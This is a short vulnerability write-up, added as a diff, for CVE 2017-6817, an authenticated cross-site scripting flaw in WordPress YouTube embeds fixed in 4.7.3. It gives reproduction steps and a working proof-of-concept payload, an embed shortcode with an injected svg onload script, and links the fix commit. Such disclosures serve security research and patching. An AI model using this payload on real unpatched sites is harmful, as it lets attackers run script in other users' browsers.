@@ -1,0 +1,29 @@
+CVE 2017-6817 - Authenticated XSS in Youtube URL Embeds
+
+
+Summary: In WordPress before 4.7.3 (wp-includes/embed.php), there is authenticated Cross-Site Scripting (XSS) in YouTube URL Embeds.
+
+
+
+Vulnerability: Cross-Site Scripting
+Tested in version: 4.2
+Fixed in version: 4.7.3
+
+
+Steps:
+
+1. In a post or comment, paste a YouTube URL with an embed code.
+
+[embed src='https://www.youtube.com/embed/du-TY1GUFGk'][/embed]
+
+2. Insert an XSS script before before the end of the code.
+
+[embed src='https://www.youtube.com/embed/du-TY1GUFGk\x3csvg onload=alert("hax")\x3e'][/embed]
+
+3. The script will load when viewing the post.
+
+
+
+Affected source code: 
+
+Link: https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
